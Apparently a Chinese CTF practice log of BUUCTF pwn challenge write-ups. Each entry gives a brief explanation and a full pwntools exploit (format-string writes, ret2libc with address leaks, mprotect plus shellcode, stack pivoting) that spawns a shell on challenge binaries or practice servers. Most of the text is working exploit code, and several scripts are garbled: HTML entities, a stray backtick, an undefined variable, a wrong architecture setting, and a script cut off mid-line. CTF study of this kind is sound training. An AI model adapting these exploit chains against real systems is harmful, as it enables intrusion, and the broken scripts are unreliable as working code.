[第五空间2019 决赛]PWN5有一个很好用的pwntools语法：\nfmtstr_payload(number,&#123;addr:value&#125;)\nnumber表示偏移字节数，addr为你要写入的地址，value为你要更改为的数值\n\n这里分析题目可以发现，我们在buf段溢出，然后覆盖dword_804C044，再输入相同的覆盖值就行\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)p = process(&#x27;./pwn&#x27;)def dbg():    gdb.attach(p)    pause()p.recvuntil(&#x27;name:&#x27;)payload = fmtstr_payload(11,&#123;0x804C044:0x1&#125;)p.sendline(payload)p.recvuntil(&#x27;passwd:&#x27;)p.sendline(&quot;1&quot;)p.interactive()\n\n8 jarvisoj_level2一个32位的题目，和64位有些区别，但不多\n32位system（）利用栈传参，不用寄存器.\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)p = process(&#x27;./pwn&#x27;)def dbg():    gdb.attach(p)    pause()sys = 0x8048320\t# system的地址binsh = 0x804A024\t#binsh的地址payload = b&#x27;a&#x27;*0x88+b&#x27;b&#x27;*0x4+p32(sys)+p32(1)+p32(binsh)#垃圾数据+覆盖返回地址(32位是4字节）+system地址调用+随意参数填充+binsh填充p.sendline(payload)p.interactive()\n\n9 ciscn_2019_n_8可以发现如果var[13]是17就getshell\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)p = process(&#x27;./pwn&#x27;)def dbg():    gdb.attach(p)    pause()payload = p32(17)*14p.sendline(payload)p.interactive()\n\n10 bjdctf_2020_babystack自定义输入长度，栈溢出\nfrom LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)p = process(&#x27;./pwn&#x27;)def dbg():    gdb.attach(p)    pause()p.sendline(b&#x27;100&#x27;)payload = b&#x27;a&#x27;*0x10+b&#x27;b&#x27;*0x8+p64(0x4006EA)p.sendline(payload)p.interactive()\n\n11 ciscn_2019_c_1ret2libc，加密的地方可以溢出，可以在输入的地方输入一个’\\0’绕开加密过程\nfrom pwn import*from LibcSearcher import*p=remote(&#x27;node5.buuoj.cn&#x27;,26071)#p = process(&#x27;./pwn&#x27;)elf=ELF(&#x27;./pwn&#x27;)main = 0x400B28pop_rdi = 0x400c83ret = 0x4006b9puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]p.sendlineafter(&#x27;Input your choice!\\n&#x27;,&#x27;1&#x27;)offset = 0x50+8payload = b&#x27;\\0&#x27;+b&#x27;a&#x27;*(offset-1)payload+=p64(pop_rdi)payload+=p64(puts_got)payload+=p64(puts_plt)payload+=p64(main)p.sendlineafter(&#x27;Input your Plaintext to be encrypted\\n&#x27;,payload)p.recvline()p.recvline()puts_addr=u64(r.recvuntil(&#x27;\\n&#x27;)[:-1].ljust(8,b&#x27;\\0&#x27;))print(hex(puts_addr))libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)Offset = puts_addr - libc.dump(&#x27;puts&#x27;)binsh = Offset+libc.dump(&#x27;str_bin_sh&#x27;)system = Offset+libc.dump(&#x27;system&#x27;)p.sendlineafter(&#x27;Input your choice!\\n&#x27;,&#x27;1&#x27;)payload = b&#x27;\\0&#x27;+b&#x27;a&#x27;*(offset-1)payload+=p64(ret)payload+=p64(pop_rdi)payload+=p64(binsh)payload+=p64(system)p.sendlineafter(&#x27;Input your Plaintext to be encrypted\\n&#x27;,payload)p.interactive()\n\n12 jarvisoj_level2_x64rdi传递binsh\n又是本地打不通，远程可以打通，不理解\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)p = process(&#x27;./pwn&#x27;)#p = remote(&#x27;node5.buuoj.cn&#x27;,28182)def dbg():    gdb.attach(p)    pause()pop_rdi = 0x00000000004006b3binsh = 0x600A90system = elf.plt[&#x27;system&#x27;]ret = 0x00000000004004a1p.recv()payload = b&#x27;b&#x27;*0x80+b&#x27;b&#x27;*8+p64(pop_rdi)+p64(binsh)+p64(system)p.sendline(payload)p.interactive()\n\n13 get_started_3dsctf_2016\n通过mprotect()函数改内存为可读可写可执行\n\n加入read函数\n\n在read函数中构造shellcode\n\n\n至于为什么是0x80EB000而不是bss段的开头0x80EBF80。\n\n 因为指定的内存区间必须包含整个内存页（4K），起始地址 start 必须是一个内存页的起始地址，并且区间长度 len 必须是页大小的整数倍。\n\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,25636)def dbg():    gdb.attach(p)    pause()pop_ret = 0x0804951D# 这里是一个有三个寄存器的pop_retmprotect_addr = elf.sym[&#x27;mprotect&#x27;]mem_addr = 0x80EB000mem_size = 0x1000mem_proc = 0x7read_addr = elf.sym[&#x27;read&#x27;]# 调用mprotect函数payload = b&#x27;a&#x27;*0x38payload+=p32(mprotect_addr)payload+=p32(pop_ret)# 填充mprotect参数payload+=p32(mem_addr)payload+=p32(mem_size)payload+=p32(mem_proc)# 调用read函数payload+=p32(read_addr)payload+=p32(pop_ret)# 填充read参数payload+=p32(0)payload+=p32(mem_addr)payload+=p32(0x100)# read返回后跳转到shellcode所在地址payload+=p32(mem_addr)p.sendline(payload)payload2 = asm(shellcraft.sh())p.sendline(payload2)p.interactive()\n\nint mprotect(void *addr, size_t len, int prot);  (NX保护绕过)\n*void addr：目标内存区域的起始地址，必须按页对齐（对齐到系统页大小）\n页是操作系统管理内存的最小单位，大小通常为4KB(4096字节)或2MB(64位某些情况下的大页内存），页对齐是指内存地址必须是页大小的整数倍\n\n\nsize_t len\n要修改权限的内存区域长度，必须是页大小的整数倍\n\n\nint prot：权限标志位，通过位掩码组合\nPROT_READ(可读)\nPROT_WRITE(可写）\nPROT_EXEC(可执行)\n\n\n返回值：\n成功：返回0\n失败：返回-1，并设置errno\n\n\n\n14 [HarekazeCTF2019]baby_ropROP构造\nfrom pwn import *p = process(&#x27;./pwn&#x27;)elf = ELF(&#x27;./pwn&#x27;)system_addr = elf.sym[&#x27;system&#x27;]binsh = 0x601048pop_rdi = 0x400683ret = 0x400479`0payload = b&#x27;a&#x27;*0x10+b&#x27;b&#x27;*0x8+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system_addr)p.sendline(payload)p.interactive()\n\n15 others_shellcode我没看明白这题想干嘛，反正直接nc就getshell了，那就这样吧，似乎是直接进行了…\n16 [OGeek2019]babyrop感觉这题有些难度，稍微讲一下吧\nchecksec一下\n❯ checksec pwn[*] &#x27;/home/pwn/pwn/buuctf/16/pwn&#x27;    Arch:       i386-32-little    RELRO:      Full RELRO    Stack:      No canary found    NX:         NX enabled    PIE:        No PIE (0x8048000)\n\n可以看到没有canary保护\n看一下主函数怎么说：\nint __cdecl main()&#123;  int buf; // [esp+4h] [ebp-14h] BYREF  char v2; // [esp+Bh] [ebp-Dh]  int fd; // [esp+Ch] [ebp-Ch]  sub_80486BB();  fd = open(&quot;/dev/urandom&quot;, 0);  if ( fd &gt; 0 )    read(fd, &amp;buf, 4u);  v2 = sub_804871F(buf);  sub_80487D0(v2);  return 0;&#125;\n\n在fd大于0的时候会读取数据，来到sub_804871F里看看\nint __cdecl sub_804871F(int a1)&#123;  size_t v1; // eax  char s[32]; // [esp+Ch] [ebp-4Ch] BYREF  char buf[32]; // [esp+2Ch] [ebp-2Ch] BYREF  ssize_t v5; // [esp+4Ch] [ebp-Ch]  memset(s, 0, sizeof(s));  memset(buf, 0, sizeof(buf));  sprintf(s, &quot;%ld&quot;, a1);  v5 = read(0, buf, 0x20u);  buf[v5 - 1] = 0;  v1 = strlen(buf);  if ( strncmp(buf, s, v1) )    exit(0);  write(1, &quot;Correct\\n&quot;, 8u);  return (unsigned __int8)buf[7];&#125;\n\n可以发现在if (strncmp(buf, s, v1))函数这里，如果s和buf的长度不一样就会退出程序\n但是这个函数本质上和strlen一样，在判断的字符串前加上\\x00就直接跳过了，所以我们在输入的垃圾字符第一位加上\\x00就行\n可以看到函数会将buf这个char型数组的buf[7]传出来给v2，再传递给sub_80487D0(v2)\n去sub_80487D0(v2)里看看\nssize_t __cdecl sub_80487D0(char a1)&#123;  char buf[231]; // [esp+11h] [ebp-E7h] BYREF  if ( a1 == 127 )    return read(0, buf, 0xC8u);  else    return read(0, buf, a1);&#125;\n\n可以看到这个里面的read读取数据的大小取决于传入的a1(其实就是v2，也就是buf[7])\n所以我们将buf[7]取到它的最大值（’\\xff’)，这个时候就可以通过溢出来构造ret2libc\n*ssize_t write(int fd, const void buf, size_t count);\nfd:文件描述符，代表要写入的目标\n0：标准输入（通常不用于写入）\n1：标准输出（默认输出到终端）\n2：标准错误（默认输出到终端）\n\n\n*const void buf:指向待写入数据的缓冲区指针\nsize_t count:要写入的字节数（从buf中读取的字节数）\n如果count为0，不会写入数据，但仍会检查文件描述符的有效性\n\n\n返回值:\n成功：返回实际写入的字节数\n失败：返回-1，并设置error标识错误类型\n\n\n\nfrom pwn import *from LibcSearcher import *context(log_level=&#x27;debug&#x27;)libc=ELF(&#x27;./libc-2.23.so&#x27;)\t# 题目描述里有下载libc-2.23.so的网址p=process(&#x27;./pwn&#x27;)#p=remote(&#x27;node5.buuoj.cn&#x27;,27450)elf=ELF(&#x27;./pwn&#x27;)ret=0x08048502payload=&#x27;\\x00&#x27;+&#x27;\\xff&#x27;*7p.sendline(payload)write_plt=elf.plt[&quot;write&quot;]write_got=elf.got[&quot;write&quot;]main_addr=0x08048825p.recvuntil(&quot;Correct\\n&quot;)payload1=b&#x27;a&#x27;*0xe7+b&#x27;a&#x27;*4+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(8)# \t\t溢出+覆盖+根据plt调用+返回main地址+wirte第一个参数+wirte第二个参数+write第三个参数p.sendline(payload1)write_addr=u32(p.recv(4))libc_base=write_addr-libc.sym[&#x27;write&#x27;]log.info(&quot;libc_base:&quot;+hex(libc_base))bin_sh_addr=libc_base+next(libc.search(b&#x27;bin/sh&#x27;))system_addr=libc_base+libc.sym[&#x27;system&#x27;]p.sendline(payload)p.recvuntil(&quot;Correct\\n&quot;)payload2=b&#x27;a&#x27;*0xe7+b&#x27;a&#x27;*4+p32(system_addr)+p32(0)+p32(bin_sh_addr)p.sendline(payload2)p.interactive()\n\n\n\n17 ciscn_2019_n_5有两种做法，第一种应该是题目的原意，但是我的ubuntu版本比较高，出现了一些问题，就直接当作ret2libc来写了\n第一种：\n因为第一次输入name的地方很大并且可执行，所以写入shellcode，然后跳转到name的地址就好\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,25442)def dbg():    gdb.attach(p)    pause()shellcode = asm(shellcraft.sh())p.recvuntil(b&#x27;name\\n&#x27;)p.sendline(shellcode)p.recvuntil(&#x27;me?\\n&#x27;)payload = b&#x27;a&#x27;*0x20+b&#x27;a&#x27;*0x8+p64(0x601080)p.sendline(payload)p.interactive()\n\n第二种：\n直接当作ret2libc来写，第二次的时候可以先把/bin/sh写入name中，然后调用name里的，记得先ret对齐一下\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,25442)def dbg():    gdb.attach(p)    pause()puts_got = elf.got[&#x27;puts&#x27;]puts_plt=elf.plt[&#x27;puts&#x27;]main = elf.sym[&#x27;main&#x27;]pop_rdi = 0x400713ret = 0x00000000004004c9p.recvuntil(&#x27;name\\n&#x27;)p.sendline(b&#x27;a&#x27;)p.recvuntil(&#x27;me?\\n&#x27;)payload = b&#x27;a&#x27;*0x20+b&#x27;b&#x27;*0x8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)p.sendline(payload)puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)libc_base = puts_addr-libc.dump(&#x27;puts&#x27;)log.info(&quot;libc_base:&quot;+hex(libc_base))system = libc_base+libc.dump(&#x27;system&#x27;)p.sendafter(b&#x27;name\\n&#x27;, b&#x27;/bin/sh\\x00&#x27;)payload =b&#x27;a&#x27;*(0x20 +8) +p64(ret) +p64(pop_rdi) +p64(0x601080) +p64(system)p.sendlineafter(b&#x27;me?\\n&#x27;,payload)p.interactive()\n\nLibcSearcher选择第6个\n18 not_the_same_3dsctf_2016ida里面可以看到，在main函数上面的get_secret函数将flag.txt里的内容读入到了bss段，那么可以用write函数将其打印出来\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,27329)def dbg():    gdb.attach(p)    pause()write_addr = elf.sym[&#x27;write&#x27;]flag = 0x80ECA2Dpayload = b&#x27;a&#x27;*45+p32(0x80489A0)+p32(write_addr)+p32(0)+p32(1)+p32(flag)+p32(42)# 填充+读取flag函数跳转+write函数调用+write返回后的地址+fd参数+flag地址+输出字节数p.sendline(payload)p.interactive()\n\n19 ciscn_2019_en_2ret2libc,没啥好说的，跟之前有一题很像\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,29048)def dbg():    gdb.attach(p)    pause()pop_rdi = 0x0000000000400c83puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]ret = 0x4006b9main = elf.sym[&#x27;main&#x27;]p.recvuntil(b&#x27;choice!\\n&#x27;)p.sendline(b&#x27;1&#x27;)p.recvuntil(b&#x27;encrypted\\n&#x27;)payload = b&#x27;\\x00&#x27;+b&#x27;a&#x27;*0x57+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)p.sendline(payload)puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)libc_base = puts_addr-libc.dump(&#x27;puts&#x27;)log.info(&quot;libc_base:&quot;+hex(libc_base))sys = libc_base+libc.dump(&#x27;system&#x27;)binsh = libc_base+libc.dump(&#x27;str_bin_sh&#x27;)p.recvuntil(b&#x27;choice!\\n&#x27;)p.sendline(b&#x27;1&#x27;)p.recvuntil(b&#x27;encrypted\\n&#x27;)payload = b&#x27;\\x00&#x27;+b&#x27;a&#x27;*0x57+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(sys)p.sendline(payload)p.interactive()\n\n20 ciscn_2019_ne_5这个题目挺有意思的\nida里看到4那个选项对应的就是GetFlag(),里面说我们输入的log就是flag，那么我们应该先选一输入system(/bin/sh),但是没找到/bin/sh，\nsystem(sh)也是可以的这份exp是直接截断了fflush，也可以用ROPgadget --binary pwn --string &quot;sh&quot;来查查，确实有一个(似乎就是这一个)\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)p = process(&#x27;./pwn&#x27;)def dbg():    gdb.attach(p)    pause()binsh = 0x80482E6+4\t#0x80482E6是字符串fflush，这里对它做了一个截断，留下了shsys_addr = 0x80484D0p.sendlineafter(b&#x27;password:&#x27;,b&#x27;administrator&#x27;)p.recvuntil(b&#x27;:&#x27;)p.sendline(b&#x27;1&#x27;)payload = b&#x27;a&#x27;*0x48+b&#x27;b&#x27;*0x4+p32(sys_addr)+b&#x27;a&#x27;*4+p32(binsh)p.recvuntil(b&#x27;info:&#x27;)p.sendline(payload)p.recvuntil(b&#x27;:&#x27;)p.sendline(b&#x27;4&#x27;)p.interactive()\n\n\nbuuctf刷题记录（21-40题）by Maple\n21_铁人三项（第五赛区) _2018_ropret2libc\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,27252)def dbg():    gdb.attach(p)    pause()write_got = elf.got[&#x27;write&#x27;]write_plt = elf.plt[&#x27;write&#x27;]main = elf.sym[&#x27;main&#x27;]payload = b&#x27;a&#x27;*0x88+b&#x27;b&#x27;*4+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)p.sendline(payload)write_addr = u32(p.recv(4))libc  = LibcSearcher(&#x27;write&#x27;,write_addr)libc_base = write_addr-libc.dump(&#x27;write&#x27;)log.info(&quot;libc_base:&quot;+hex(libc_base))sys = libc_base+libc.dump(&#x27;system&#x27;)binsh = libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload2 = b&#x27;a&#x27;*0x88+b&#x27;b&#x27;*4+p32(sys)+p32(0)+p32(binsh)p.sendline(payload2)p.interactive()\n\n22 bjdctf_2020_babystack2看源码，发现输入长度是int型，而read读取的长度为unsigned int型，所以输入-1就可以了\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,27683)def dbg():    gdb.attach(p)    pause()p.sendline(&#x27;-1&#x27;)p.recvuntil(b&#x27;name?\\n&#x27;)payload = b&#x27;a&#x27;*0x10+b&#x27;b&#x27;*0x8+p64(0x400726)p.sendline(payload)p.interactive()\n\n23 bjdctf_2020_babyropret2libc\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,26423)def dbg():    gdb.attach(p)    pause()puts_plt=elf.plt[&#x27;puts&#x27;]puts_got=elf.got[&#x27;puts&#x27;]main=elf.sym[&#x27;main&#x27;]pop_rdi = 0x400733p.recvuntil(b&#x27;story!\\n&#x27;)payload = b&#x27;a&#x27;*0x20+b&#x27;b&#x27;*0x8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)p.sendline(payload)puts_addr = u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)libc_base = puts_addr-libc.dump(&#x27;puts&#x27;)p.recvuntil(b&#x27;story!\\n&#x27;)sys = libc_base+libc.dump(&#x27;system&#x27;)binsh = libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload2 = b&#x27;a&#x27;*0x20+b&#x27;b&#x27;*0x8+p64(pop_rdi)+p64(binsh)+p64(sys)+p64(main)p.sendline(payload2)p.interactive()\n\n24 jarviso_fm看名字就知道是格式化字符串，x&#x3D;&#x3D;4的时候就可以getshell\n直接找到x的地址，用自带函数就行\nfrom pwn import *p = process(&#x27;./pwn&#x27;)payload = fmtstr_payload(11,&#123;0x804a02c:0x4&#125;)p.sendline(payload)p.interactive()\n\n25 jatviso_tell_me_something这道题有一点小坑,一般都是将ebp压入栈，然后将esp的值赋值给ebp，然后esp减去对应的栈空间的大小\npush\tebpmov\t\tebp, espsub\t\tesp, 18h\n\n但是这道题直接将rsp减去0x88，这里并没有把rbp压入栈，所以只需要0x88大小就可以覆盖返回地址了\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,28402)def dbg():    gdb.attach(p)    pause()payload = b&#x27;a&#x27;*0x88+p64(0x400620)p.recvuntil(&#x27;:&#x27;)p.sendline(payload)p.interactive()\n\n26 ciscn_2019_es_2发现溢出只有八字节，需要栈迁移\n我觉得这位师傅讲的不错，ciscn_2019_es_2\nfrom pwn import * context.terminal = [&#x27;terminator&#x27;,&#x27;-x&#x27;,&#x27;sh&#x27;,&#x27;-c&#x27;]context.log_level=&#x27;debug&#x27;p=remote(&#x27;node5.buuoj.cn&#x27;,25052)#p=process(&quot;./pwn&quot;)elf = ELF(&#x27;./pwn&#x27;)sys_addr=elf.sym[&#x27;system&#x27;]leave_ret=0x080484b8p.recvuntil(&quot;name?\\n&quot;)payload1= 0x20*&quot;a&quot;+&quot;b&quot;*0x8p.send(payload1)p.recvuntil(&quot;b&quot;*0x8)ebp_addr=u32(p.recv(4))log.info(&#x27;ebp:&#x27;+hex(ebp_addr))payload2 = (b&quot;aaaa&quot;+p32(sys_addr)+b&#x27;aaaa&#x27;+p32(ebp_addr-0x28)+b&#x27;/bin/sh&#x27;).ljust(0x28,b&#x27;\\x00&#x27;)+p32(ebp_addr-0x38) + p32(leave_ret)p.send(payload2)p.interactive()\n\n栈迁移vul函数看一下\nint vul()&#123;  char s[40]; // [esp+0h] [ebp-28h] BYREF  memset(s, 0, 0x20u);  read(0, s, 0x30u);  printf(&quot;Hello, %s\\n&quot;, s);  read(0, s, 0x30u);  return printf(&quot;Hello, %s\\n&quot;, s);&#125;\n\n可以看到read大小为0x30，但是s变量和ebp的距离是0x28。八字节的溢出只够覆盖ebp和ret，不可以做到直接修改hack函数里system的参数。所以我们利用leave_ret挟持esp进行栈迁移\n若无限制，构造的栈长这样：\n\n\n\n\n&#x2F;bin&#x2F;sh\n\n\n\n\n&#x2F;bin&#x2F;sh_addr\n\n\n\n0xdeadbeef\n\n\nreturn\nsystem_addr\n\n\nebp\naaaa\n\n\ns\n垃圾数据\n\n\nesp\n\n\n\n但是有限制，所以通过leave转移到别处，因此将ebp的内容改为s的地址，return改为leave的地址\n执行两次leave之后栈的样子\n\n\n\nreturn\nleave_ret_addr\n\n\n\nebp\ns_addr\n\n\n\n\n\n\nesp\n\n\n\ns\n垃圾数据\n\n\n一般leave命令后面都会跟着ret命令，也是必须要有的。此处如果继续执行ret命令就会返回到esp所指向内容填写的地址，那么接下来就很好办了，我们构造栈的内容\n\n\n\nreturn\nleave_ret_addr\n\n\n\nebp\naaaa\n\n\n\n\n\n\n\n&#x2F;bin&#x2F;sh\n\n\n\n&#x2F;bin&#x2F;sh_addr\n\n\n\n0xdeadbeef\n\n\nesp\nsystem_addr\n\n\ns\n垃圾数据\n\n\n当然此处我们还有一个问题就是’&#x2F;bin&#x2F;sh’的地址我们不知道。我们可以通过泄露原来ebp的值来确定，我们将此地址叫做addr，以免和ebp寄存器混淆\nint vul()&#123;    char s[40]; //\t[esp+0h][ebp-28h]BYREF        memset(s, 0x20u);    read(0, s, 0x30u);    printf(&quot;Hello, %s\\n&quot;, s);    read(0, s, 0x30u);    return printf(&quot;Hello, %s\\n&quot;, s);&#125;\n\n可以看到有一个printf函数\nprintf函数会打印s字符串，且遇到0就会停止打印，所以如果我们将addr之前的内容全部填充不为0的字符，就能将addr打印出来，我们通过地址再计算出addr到s的距离，我们就可以通过addr来表示/bin/sh所在的地址了。\n我们先通过第一个read传入payload，然后通过printf打印出addr的值,然后通过第二个read函数构造栈转移，执行systeam(&#39;/bin/sh&#39;)\n27 HarekazeCTF2019 baby_rop2ret2libc，但是用printf输出read函数的地址\nfrom pwn import *from LibcSearcher import LibcSearcher#p=process(&#x27;./pwn&#x27;)p=remote(&#x27;node5.buuoj.cn&#x27;,25118)elf=ELF(&#x27;./pwn&#x27;)read_got=elf.got[&#x27;read&#x27;]printf_plt=elf.plt[&#x27;printf&#x27;]main_addr=elf.sym[&#x27;main&#x27;]format_addr=0x400770\t# 原本输出字符串的地址pop_rdi = 0x400733pop_rsi_r15 = 0x400731payload=b&#x27;a&#x27;*0x20+b&#x27;b&#x27;*0x8\t# 设置溢出覆盖返回地址payload+=p64(pop_rdi)+p64(format_addr)\t# pop_rdi弹入原本字符串payload+=p64(pop_rsi_r15)+p64(read_got)+p64(0)# ret到pop_rsi_r15，将read的got表地址弹入rsi，随便一个东西弹入r15payload+=p64(printf_plt)+p64(main_addr)# ret到printf的plt表地址，也就是调用plt，然后返回mainp.sendlineafter(b&quot;name?&quot;,payload)p.recvuntil(b&#x27;!\\n&#x27;)read_addr=u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc=LibcSearcher(&quot;read&quot;,read_addr)libc_base=read_addr-libc.dump(&#x27;read&#x27;)log.info(&quot;libc_base:&quot;+hex(libc_base))sys_addr=libc_base+libc.dump(&quot;system&quot;)binsh_addr=libc_base+libc.dump(&quot;str_bin_sh&quot;)payload2=b&#x27;a&#x27;*40+p64(pop_rdi)+p64(binsh_addr)+p64(sys_addr)+p64(0)p.sendline(payload2)p.interactive()\n\n这道题远程直接cat flag不能用，先find -name &quot;flag&quot;找到flag放在了./home/babyrop2/flag里，再cat\n28 picoctf_2018_rop chain很简单的溢出、改数据，拿flag\n注意里面这一句\nif (win1 &amp;&amp; win2 &amp;&amp; a1 == -559039827)\n\n是win1和win2,a1和-559039827,得到的结果再&amp;&amp;\nfrom pwn import *#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,26736)win1_addr = 0x80485CBwin2_addr = 0x80485D8flag = 0x804862Bpop_ebp = 0x80485d6payload = b&#x27;a&#x27;*0x18+b&#x27;b&#x27;*0x4+p32(win1_addr)+p32(win2_addr)+p32(flag)+p32(0xBAAAAAAD)+p32(0xDEADBAAD)# 先返回到win1使得win1 = 1# 然后返回win2，因为要与ebp+8比较，所以中间先加一个flag_addr# 比较好了直接返回到flag_addr# 然后与ebp+8进行比较，正好夹了一个0xBAAAAAADp.sendline(payload)p.interactive()\n\n29 pwn2_sctf_2016先输入一个负值就可以溢出了，跟正常libc没区别，就是我的LibcSearcher没找到对应的libc，看网上师傅的博客有说选13，但是我的只显示到9\n破案了，LibcSearcher会随机roll，看运气(有点过于艺术了)\nroll了半个小时，靶机都过期了，算了，本地过了就行了，本地选5\nfrom pwn import *from LibcSearcher import *from time import sleepcontext(os=&#x27;linux&#x27;, arch=&#x27;arm64&#x27;, log_level=&#x27;debug&#x27;)r = remote(&quot;node5.buuoj.cn&quot;,26858)elf = ELF(&#x27;./pwn&#x27;)printf_plt = elf.plt[&#x27;printf&#x27;]printf_got = elf.got[&#x27;printf&#x27;]start_addr = 